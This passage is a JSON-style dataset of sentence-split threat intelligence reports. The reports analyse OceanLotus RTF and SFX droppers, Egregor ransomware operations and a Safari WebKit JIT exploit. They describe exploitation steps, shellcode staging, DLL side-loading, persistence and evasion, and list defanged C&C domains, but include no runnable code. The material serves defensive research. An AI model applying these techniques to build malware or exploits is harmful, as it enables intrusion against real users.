        "text": "This document FW Report on demonstration of former CNRP in Republic of Korea.doc (SHA-1: D1357B284C951470066AAA7A8228190B88A5C7C3) is similar to the one mentioned in the article above, and also interesting as it really targets people interested in Cambodian politics (the CNRP \u2013 Cambodia National Rescue Party \u2013 political party was dissolved in late 2017).",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1040.md:::S1",
        "text": "Despite its .doc extension, the document is actually in RTF format (see Figure 1), contains many garbage groups, and is also malformed.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1040.md:::S2",
        "text": "Despite the presence of malformed elements, Word successfully opens this RTF file.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1040.md:::S3",
        "text": "As seen in (Figure 2), at offset 0xC00 there is an EQNOLEFILEHDR structure, followed by the MTEF header and then an MTEF record (Figure 3) for a font.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1040.md:::S4",
        "text": "An overflow in the name field is possible because its size isn\u2019t checked before being copied.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1040.md:::S5",
        "text": "A name that is too long triggers the vulnerability.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1040.md:::S6",
        "text": "As seen in the RTF file content (offset 0xC26 in Figure 2), the buffer is filled with shellcode followed by a NOP (0x90) sled and the return address 0x402114.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1040.md:::S7",
        "text": "That address is a gadget in EQNEDT32.exe pointing to a RET instruction.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1040.md:::S8",
        "text": "This results in EIP pointing at the beginning of the name field which contains the shellcode.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1040.md:::S9",
        "text": "The address 0x45BD3C stores a variable that is dereferenced until it reaches a pointer to the currently loaded MTEFData structure.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1040.md:::S10",
        "text": "That is where the rest of the shellcode resides.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1040.md:::S11",
        "text": "The purpose of the shellcode is to execute a second piece of shellcode, embedded inside the open document.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1040.md:::S12",
        "text": "First, the initial shellcode tries to find the handle of the open document file by iterating through all the system\u2019s handles (NtQuerySystemInformation with the SystemExtendedHandleInformation argument) and checking if the handle\u2019s PID matches the PID of a WinWord process and if the document was opened with the following access mask: 0x12019F.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1040.md:::S13",
        "text": "To confirm it found the right handle and not the handle of another open document, the content of the file is mapped with the CreateFileMapping function and the shellcode checks if the last four bytes of the document are \u201cyyyy\u201c; this technique is called \u201cEgg Hunting\u201d.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1040.md:::S14",
        "text": "Once it finds a match, the document is copied to a temporary folder (GetTempPath) as ole.dll.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1040.md:::S15",
        "text": "Then the last 12 bytes of the document are read.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1040.md:::S16",
        "text": "The 32-bit value between the AABBCCDD and yyyy markers is the offset to the next shellcode.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1040.md:::S17",
        "text": "It is invoked using the CreateThread function.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1040.md:::S18",
        "text": "The extracted shellcode is the same that the OceanLotus group has been using for a while now.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1040.md:::S19",
        "text": "The Python emulator script we released in March 2018 still works to dump the next stage.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1040.md:::S20",
        "text": "The filenames and directories are chosen dynamically.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1040.md:::S21",
        "text": "The code randomly selects the filename of an executable or DLL file located in C:\\Windows\\system32.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1040.md:::S22",
        "text": "It will then query its resources and extract the FileDescription field to use as a folder name.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1040.md:::S23",
        "text": "If this does not work, the code randomly chooses a folder name from the %ProgramFiles% or C:\\Windows (from GetWindowsDirectoryW) directories.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1040.md:::S24",
        "text": "It avoids using a name that may clash with existing files by making sure it does not contain: windows, Microsoft, desktop, system, system32 or syswow64.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1040.md:::S25",
        "text": "If the directory already exists, the directory name is appended with \u201cNLS_{6 digits}\u201d.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1040.md:::S26",
        "text": "The stage\u2019s 0x102 resource is parsed and the files are dropped in either %ProgramFiles% or %AppData% in the randomly chosen folder.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1040.md:::S27",
        "text": "The creation times are changed to have the same values as kernel32.dll.\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1040.md:::S28",
        "text": "For example, here is a folder and a list of files created by picking the C:\\Windows\\system32\\TCPSVCS.exe executable as a source of data.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1040.md:::S29",
        "text": "The structure of the resource 0x102 in the dropper is quite complex.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1040.md:::S30",
        "text": "In a nutshell, it contains:\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1040.md:::S31",
        "text": "- filenames",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1040.md:::S32",
        "text": "- files\u2019 size and content",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1040.md:::S33",
        "text": "- compression format ( COMPRESSION_FORMAT_LZNT1 used by RtlDecompressBuffer function)",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1040.md:::S34",
        "text": "The first file is dropped as TCPSVCS.exe which is in fact Adobe\u2019s legitimate AcroTranscoder.exe (according to its FileDescription, SHA-1: 2896738693A8F36CC7AD83EF1FA46F82F32BE5A3).",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1040.md:::S35",
        "text": "You may have noticed that the file size of some DLLs exceeds 11MB.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1040.md:::S36",
        "text": "This is because a large contiguous buffer of random data is placed inside the executable.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1040.md:::S37",
        "text": "It is possibly a way to evade detection by some security products.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1040.md:::S38",
        "text": "The resource 0x101 of the dropper contains two 32-bit integers that dictate how the persistence should be implemented.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1040.md:::S39",
        "text": "The value of the first one specifies how the malware will achieve persistence without administrator privileges.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1040.md:::S40",
        "text": "The value of the second integer specifies how the malware should try to achieve persistence if it runs with elevated privileges.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1040.md:::S41",
        "text": "The service name is the filename without extension; the display name is the folder name but if it already exists then the string \u201cRevision 1\u201d is appended (the number is incremented until it finds an unused name).",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1040.md:::S42",
        "text": "The operators made sure the persistence through the service would be resilient: on service failure, the service should restart after 1 second.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1040.md:::S43",
        "text": "Then, the registry value WOW64 of the new service key is set to 4 which indicates that it\u2019s a 32-bit service.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1040.md:::S44",
        "text": "The scheduled task is created via several COM interfaces: ITaskScheduler, ITask, ITaskTrigger, IPersistFile and ITaskScheduler.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1040.md:::S45",
        "text": "Essentially, the malware creates a hidden task, sets the account information with the current user or the administrator information and sets the trigger.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1040.md:::S46",
        "text": "This is a daily task with a duration of 24 hours and the interval between two executions is set to 10 minutes, which means it will run all the time.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1040.md:::S47",
        "text": "In our example, the executable TCPSVCS.exe (AcroTranscoder.exe) is legitimate software side-loading the DLLs that were dropped with it.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1040.md:::S48",
        "text": "In this case, the Flash Video Extension.dll is the interesting one.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1040.md:::S49",
        "text": "Its DLLMain function just calls a single function.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1040.md:::S50",
        "text": "Some opaque predicates are present:",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1040.md:::S51",
        "text": "After these deceptive checks, the code gets the .text section of TCPSVCS.exe, changes its protection to PAGE_EXECUTE_READWRITE and overwrites it with do-nothing instructions that have no side effects:\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1040.md:::S52",
        "text": "At the end, a CALL instruction to the address of the function FLVCore::Uninitialize(void) exported by Flash Video Extension.dll is appended.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1040.md:::S53",
        "text": "This means that, after loading the malicious DLL, when the runtime calls WinMain in TCPSVCS.exe, the instruction pointer will point to the NOP sled, which will eventually call FLVCore::Uninitialize(void), the next stage.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1040.md:::S54",
        "text": "This function simply creates a mutex starting with{181C8480-A975-411C-AB0A-630DB8B0A221}and followed by the current username.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1040.md:::S55",
        "text": "Then, it reads the dropped file with the .db3 extension, which contains position-independent code, and uses CreateThread to execute its content.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1040.md:::S56",
        "text": "The content of the .db3 file is shellcode commonly used by OceanLotus.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1040.md:::S57",
        "text": "Again, we successfully unpacked its payload using the emulator script we published on GitHub.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1040.md:::S58",
        "text": "The script extracts the final stage.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1040.md:::S59",
        "text": "This component is the backdoor that we already analysed in this white paper: OceanLotus: Old techniques, new backdoor.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1040.md:::S60",
        "text": "It is recognizable as such from the GUID {A96B020F-0000-466F-A96D-A91BBF8EAC96} that is present in the binary.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1040.md:::S61",
        "text": "The configuration of the malware is still encrypted in a PE resource.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1040.md:::S62",
        "text": "It contains almost the same configuration but the C&C servers are different from the ones that were already published:\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1040.md:::S63",
        "text": "- andreagahuvrauvin[.]com",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1040.md:::S64",
        "text": "- byronorenstein[.]com",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1040.md:::S65",
        "text": "- stienollmache[.]xyz",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1040.md:::S66",
        "text": "Once again OceanLotus showcases a large combination of techniques to stay under the radar.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1040.md:::S67",
        "text": "They came back with a \u201cbetter\u201d version of the infection process.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1040.md:::S68",
        "text": "By choosing random names and filling executables with random data, they reduce the number of reliable IoCs (hash-based and filename-based).",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1040.md:::S69",
        "text": "Moreover, since they\u2019re using DLL side-loading, the attackers only have to drop the legitimate AcroTranscoder binary as-is.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1040.md:::S70",
        "text": "After using RTF files, the group started using self-extracting (SFX) archives that use common document icons in an attempt to further mislead their victims.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1040.md:::S71",
        "text": "It was briefly documented by Threatbook (in Chinese).",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1040.md:::S72",
        "text": "When run, these self-extracting RAR files drop and execute DLL files (with a .ocx extension) with the final payload being the previously documented {A96B020F-0000-466F-A96D-A91BBF8EAC96}.dll.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1040.md:::S73",
        "text": "Since the middle of January 2019, OceanLotus began reusing the technique but changed some configuration over time.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1040.md:::S74",
        "text": "This section will describe the technique and what they have altered to achieve their goal.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1040.md:::S75",
        "text": "The document THICH-THONG-LAC-HANH-THAP-THIEN-VIET-NAM (1).EXE (meaning \u201cFAVORITE RELATIONSHIP OF VIETNAMESE PERFORMANCE\u201d according to Google Translate, SHA-1: AC10F5B1D5ECAB22B7B418D6E98FA18E32BBDEAB) was first seen in 2018.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1040.md:::S76",
        "text": "This SFX file is cleverly crafted, as the description (Version Info) states it\u2019s a \u201cJPEG Image\u201d.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1040.md:::S77",
        "text": "The script of the SFX is the following:\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1040.md:::S78",
        "text": "The malware drops {9ec60ada-a200-4159-b310-8071892ed0c3}.ocx (SHA-1: EFAC23B0E6395B1178BCF7086F72344B24C04DCC) as well as the image 2018 thich thong lac.jpg.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1040.md:::S79",
        "text": "The decoy image is the following:",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1040.md:::S80",
        "text": "You may have noticed the first two lines in the SFX script invoke the OCX file twice, but it is not a mistake\u2026\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1040.md:::S81",
        "text": "{9ec60ada-a200-4159-b310-8071892ed0c3}.ocx (ShLd.dll)",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1040.md:::S82",
        "text": "The OCX file\u2019s control flow is very similar to other OceanLotus components: there are a lot of JZ/JNZ and PUSH/RET instruction sequences interleaved with junk code.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1040.md:::S83",
        "text": "After filtering the junk code, the export DllRegisterServer called by regsvr32.exe looks like this:",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1040.md:::S84",
        "text": "Basically, the first time the DllRegisterServer is called, it sets the registry value HKCU\\SOFTWARE\\Classes\\CLSID\\{E08A0F4B-1F65-4D4D-9A09-BD4625B9C5A1}\\Model to an encoded offset in the DLL (0x10001DE0).\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1040.md:::S85",
        "text": "The second time the function is called, it reads this very same value and executes the function at that address.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1040.md:::S86",
        "text": "From there, the resource is read and executed and many in-memory operations are executed.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1040.md:::S87",
        "text": "The shellcode is the same PE loader used in the earlier OceanLotus campaigns.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1040.md:::S88",
        "text": "It can be emulated with our miasm emulation script.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1040.md:::S89",
        "text": "Ultimately, it drops db293b825dcc419ba7dc2c49fa2757ee.dll, loads it into memory and executes DllEntry.\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1040.md:::S90",
        "text": "The DLL retrieves the content of its resource, decrypts (AES-256-CBC) and decompresses it (LZMA).",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1040.md:::S91",
        "text": "The resource has a specific format that is quite easy to reverse engineer.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1040.md:::S92",
        "text": "The configuration is explicit: depending on the privilege level, the binary data will be written to either %appdata%\\Intel\\logs\\BackgroundUploadTask.cpl or %windir%\\System32\\BackgroundUploadTask.cpl (or SysWOW64 for 64-bit systems).\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1040.md:::S93",
        "text": "Next, persistence is achieved by creating a task named BackgroundUploadTask[junk].job where a [junk]is a collection of 0x9D and 0xA0 bytes.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1040.md:::S94",
        "text": "The application name of the task is %windir%\\System32\\control.exe and the parameter value is the path of the dumped binary.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1040.md:::S95",
        "text": "The hidden task is set to run every day.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1040.md:::S96",
        "text": "Structurally, the CPL file is a DLL whose internal name is ac8e06de0a6c4483af9837d96504127e.dll and that exports a CPlApplet function.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1040.md:::S97",
        "text": "This file decrypts its only resource {A96B020F-0000-466F-A96D-A91BBF8EAC96}.dll, then loads that DLL and calls its only export, DllEntry.\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1040.md:::S98",
        "text": "The backdoor has an encrypted configuration embedded in its resources.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1040.md:::S99",
        "text": "The structure of the configuration file is quite similar to the previous one.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1040.md:::S100",
        "text": "Despite the structural similarity, of the values in many of these fields have been updated comparing this to that in our white paper from March 2018.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1040.md:::S101",
        "text": "The first element of the binaries array contains a DLL (HttpProv.dll MD5: 2559738D1BD4A999126F900C7357B759) identified by Tencent but as the export name has been removed from the binary, the hashes don\u2019t match.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1040.md:::S102",
        "text": "While hunting for samples, a few characteristics stood out.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1040.md:::S103",
        "text": "The sample just analysed appeared around July 2018 and other similar were found very recently in mid-January through early-February 2019.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1040.md:::S104",
        "text": "The infection vector used was an SFX archive dumping a legitimate, decoy document and a malicious OCX file.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1040.md:::S105",
        "text": "Even though OceanLotus uses fake timestamps, it has been observed that the timestamp of the SFX and OCX files are always the same (0x57B0C36A (08/14/2016 @ 7:15pm UTC) and 0x498BE80F (02/06/2009 @ 7:34am UTC) respectively).",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1040.md:::S106",
        "text": "This probably means that they have some kind of \u201cbuilder\u201d that reuses the same templates and just changes some characteristics.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1040.md:::S107",
        "text": "Among the documents we analysed since early-2018, we saw different document names suggesting country-related targeting:",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1040.md:::S108",
        "text": "- The New Contact Information Of Cambodia Media(New).xls.exe",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1040.md:::S109",
        "text": "- \u674e\u5efa\u9999 (\u4e2a\u4eba\u7b80\u5386 ) .exe (fake pdf document of a CV)",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1040.md:::S110",
        "text": "- .exe (fake pdf document of a CV) feedback, Rally in USA from July 28-29, 2018.exe",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1040.md:::S111",
        "text": "Since the discovery of the {A96B020F-0000-466F-A96D-A91BBF8EAC96}.dll backdoor and its public analysis by multiple researchers, we observed some changes in the malware\u2019s configuration data.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1040.md:::S112",
        "text": "First, the authors started removing the names from the helper DLLs (DNSprov.dll and the two versions of HttpProv.dll).",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1040.md:::S113",
        "text": "Then the operators stopped packaging the third DLL (second version of HttpProv.dll), choosing to embed just one.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1040.md:::S114",
        "text": "Second, a lot of the backdoor configuration fields have been changed, perhaps to avoid detection, since many IoCs became available.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1040.md:::S115",
        "text": "The important fields that changed are the following:\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1040.md:::S116",
        "text": "- the \u201cAppX\u201d registry key changed (see IoCs)",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1040.md:::S117",
        "text": "- the mutex encoding string (\u201cdef\u201d, \u201cabc\u201d, \u201cghi\u201d)\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1040.md:::S118",
        "text": "- the port number",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1040.md:::S119",
        "text": "Finally, all the new variants analysed have new C&C servers, which are listed in the IoCs section.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1074.md:::S0",
        "text": "Since Egregor is a relatively new player in the game, not many incidents involving it are covered and detailed here, including information about the infection chain.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1074.md:::S1",
        "text": "The information available so far suggests that the initial infection starts with a phishing email that contains a malicious macro embedded in an attached document.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1074.md:::S2",
        "text": "The macro code downloads a commodity malware, either Qbot icedID or Ursnif, which provides capabilities for stealing sensitive information that will later be used for lateral movement.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1074.md:::S3",
        "text": "This technique, which involves using a commodity malware as initial infection and to eventually deliver ransomware, was observed before with Ryuk ransomware and Maze.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1074.md:::S4",
        "text": "Later in the attack, a CobaltStrike beacon is installed on the infected machine and the attack shifts to an interactive hacking operation.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1074.md:::S5",
        "text": "The attacker uses tools for reconnaissance such as Adfind and Sharphound to gather information about users, groups, computers and so on.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1074.md:::S6",
        "text": "This information will assist in the lateral movement phase and also in performing privilege escalation, as Egregor compromises Active Directory in order to become domain admin.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1074.md:::S7",
        "text": "In this stage, after the malware settles on the victim\u2019s machine, it starts communications to the C2 in order to download additional components including scripts, DLLs and other files that will be used eventually to exfiltrate data and encrypt files.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1074.md:::S8",
        "text": "Among the dropped files observed:\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1074.md:::S9",
        "text": "- A batch file that is used to run Bitsadmin and Rundll to download and execute the Egregor payload.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1074.md:::S10",
        "text": "- A Zip file contains a binary file that is an RClone client, renamed svchost, and RClone config files (webdav, ftp and dropbox) used later for exfiltration.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1074.md:::S11",
        "text": "CobaltStrike creates a service that runs an encoded PowerShell command that executes shellcode that creates connection to amajai-technologies[.]industries:",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1074.md:::S12",
        "text": "After dropping the files needed for the attack, the attackers \u201cprepare the ground\u201d and undertake a final procedure meant to avoid detection and prevention.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1074.md:::S13",
        "text": "The attacker creates a Group Policy Object (GPO) to disable Windows Defender and tries to take down any anti-virus products.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1074.md:::S14",
        "text": "As described above, the operators of Egregor deploy the ransomware payload after collecting the sensitive information and setting the GPO to evade detection and prevention.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1074.md:::S15",
        "text": "To deploy the ransomware, they execute the dropped batch file that, as mentioned, is used to download and execute the ransomware payload from a remote server:\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1074.md:::S16",
        "text": "The Egregor payload can only be decrypted if the correct key is provided via command line argument to the Rundll32 process, which means that the file cannot be analyzed, either manually or using a sandbox, if the exact same command line that the attackers used to run the ransomware isn\u2019t provided.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1074.md:::S17",
        "text": "In order to execute the ransomware and decrypt the blob of code inside of it, the operators provide the batch file with the key \u201c-passegregor10\u201d which resolves in the ransomware running and encrypting files:\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1074.md:::S18",
        "text": "The encrypted file names are appended with a string of random characters as the new extension.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1074.md:::S19",
        "text": "For example, it renames a file named \u201cMy_files.zip\u201d to \u201cMy_files.zip.IAsnM\u201d, \u201cMy_files2.zip\u201d to \u201cMy_files2.zip.WZlF\u201d and so on.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1074.md:::S20",
        "text": "Also, the threat actor creates the \u201cRECOVER-FILES.txt\u201d with ransom note in all folders that contain encrypted files, as shown in the figure below:",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1074.md:::S21",
        "text": " \t ",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1100.md:::S0",
        "text": "The exploit used to gain code execution in the browser is quite complex and had more than 1,000 lines of code once formatted nicely.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1100.md:::S1",
        "text": "It\u2019s interesting to note that some code, which suggests the vulnerability could also have been exploited on iOS and even on PAC-enabled (Pointer Authentication Code) devices such as the iPhone XS and newer, has been commented out, as seen in Figure 5.\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1100.md:::S2",
        "text": "We have confirmed that the patch identified by Google TAG does fix the vulnerability.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1100.md:::S3",
        "text": "While it is possible this vulnerability was assigned CVE-2021-1789, we couldn\u2019t confirm due to the lack of publicly available technical details.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1100.md:::S4",
        "text": "Below we outline our understanding of how the vulnerability affects Safari versions prior to 14.1.\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1100.md:::S5",
        "text": "The exploit implements two primitives to gain memory read and write access: one to leak the address of an object (addrof) and one to create a fake JavaScript object from a given memory address (fakeobj).",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1100.md:::S6",
        "text": "Using these two functions, the exploit creates two arrays of different types that overlap in memory, and thus is able to set a value in one of them that is treated as a pointer when accessed using the other.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1100.md:::S7",
        "text": "The technique is well described by Samuel Gro\u00df in his multiple publications on the subject.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1100.md:::S8",
        "text": "Below we explain the vulnerability that made the leakage of object addresses possible.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1100.md:::S9",
        "text": "The exploit relies on a side effect caused by modifying an object property to be accessible via a \u201cgetter\u201d function while enumerating the object\u2019s properties in JIT-compiled code.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1100.md:::S10",
        "text": "The JavaScript engine erroneously speculates that the value of the property is cached in an array and is not the result of calling the getter function.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1100.md:::S11",
        "text": "We have extracted the relevant part of the code that enables the addrof primitive, which you can see in Figure 6.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1100.md:::S12",
        "text": "Comments starting with (e)r are from ESET Research.\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1100.md:::S13",
        "text": "The first corruption happening here is the result of bar(vic).",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1100.md:::S14",
        "text": "The function will return a pointer to a JSCell object (to be more precise, a GetterSetter), which should never be accessible from the JavaScript code.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1100.md:::S15",
        "text": "Here is the result of describe(bar(vic)) in a JavaScriptCore console:\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1100.md:::S16",
        "text": "This JSCell is then converted to a JSObject by calling the JavaScript Object function.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1100.md:::S17",
        "text": "Internally, this results in calling the JSCell\u2019s toObject method.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1100.md:::S18",
        "text": "There is no implementation for converting a GetterSetter to a JSObject and the code will eventually fall back and assume its type is a Symbol.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1100.md:::S19",
        "text": "The GetterSetter will erroneously be cast to a Symbol.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1100.md:::S20",
        "text": "You may have noticed the assertion that the cell type is a Symbol before performing the cast in the code; however, the ASSERT macro in WebKit is compiled out of release builds.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1100.md:::S21",
        "text": "In memory, the location of getter[0] is the same as this corrupted symbol\u2019s value.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1100.md:::S22",
        "text": "Thus, reassigning a value to getter[0] will change the value of the symbol.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1100.md:::S23",
        "text": "Its value is fetched from JavaScript using its toString method.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1100.md:::S24",
        "text": "The updated JavaScriptCore code now checks whether the object contains properties with GetterSetter after the property enumeration, before considering whether the object\u2019s attribute can be accessed \u201cquickly\u201d.\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1100.md:::S25",
        "text": "Detailing the fake object creation would require an article of its own.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1100.md:::S26",
        "text": "In short, it abuses the same bug, although this time the object is manipulated in a way that the JIT-compiled code accesses an item that is out-of-bounds and returns an address that was carefully sprayed on the heap before the fetch.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1100.md:::S27",
        "text": "The rest of the code allows bypassing mitigations, such as the Gigacage, and loads the next stage.",
        "type": ""
    },
    {
